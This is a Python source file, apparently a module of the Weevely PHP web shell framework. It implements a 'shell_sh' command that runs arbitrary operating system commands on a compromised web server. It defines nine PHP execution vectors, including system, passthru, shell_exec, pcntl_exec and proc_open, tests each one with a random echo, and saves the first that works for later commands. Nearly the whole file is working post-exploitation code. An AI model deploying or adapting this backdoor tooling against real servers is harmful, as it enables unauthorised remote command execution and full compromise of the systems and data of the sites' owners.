from core.vectors import Os, Vector
from core.module import Module
from core.weexceptions import InterpreterException
from core import messages
import logging, random

class Sh(Module):

    """Execute Shell commands.
    
    Usage:
      shell_sh <command>
    
    """
    
    def initialize(self):
        
        self._register_arguments(
         # Declare mandatory arguments
         arguments = [ 
                      'command' 
                      ],
         # Declare additional options               
         options = {
                    
                    'stderr_redirection' : ' 2>&1',
                    'vector' : ''
        })

        self._register_vectors([
            Vector("system", 'shell.php', """@system("${args['command']}${args['stderr_redirection']}");"""),
            Vector("passthru", 'shell.php', "@passthru('${args['command']}${args['stderr_redirection']}');"),
            Vector("shell_exec", 'shell.php', "print(@shell_exec('${args['command']}${args['stderr_redirection']}'));"),
            Vector("exec", 'shell.php',  "$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));"),
            Vector("pcntl", 'shell.php', """$p=@pcntl_fork(); if(!$p) { { @pcntl_exec( "/bin/sh", Array("-c", "${args['command']}")); } else { @pcntl_waitpid($p,$status); }}""", Os.NIX),
            Vector("popen", 'shell.php', "$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }"),
            Vector("python_eval", 'shell.php', "@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');"),
            Vector("perl_system", 'shell.php', "if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}'); print($r); }"),
            Vector("proc_open", 'shell.php', """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }"""),
       ])

        
        
    def check(self, args):
        """ Check if remote Sh interpreter works """

        rand = str(random.randint( 11111, 99999 ))
        
        args_check = { 'command' : 'echo %s' % rand, 'stderr_redirection' : '' }

        for vector in self.vectors:
            
            output = self.terminal.run_shell_php([ vector.format(args_check) ])
            
            if output and output.strip() == rand:
                self.vectors.save_default_vector(vector.name)
                logging.debug(vector.name)
                
                return True
            
        logging.debug('no vector found')
        return False
        
    def run(self, args):

        command = self.vectors.get_default_vector().format(args)
        return self.terminal.run_shell_php([ command ])
        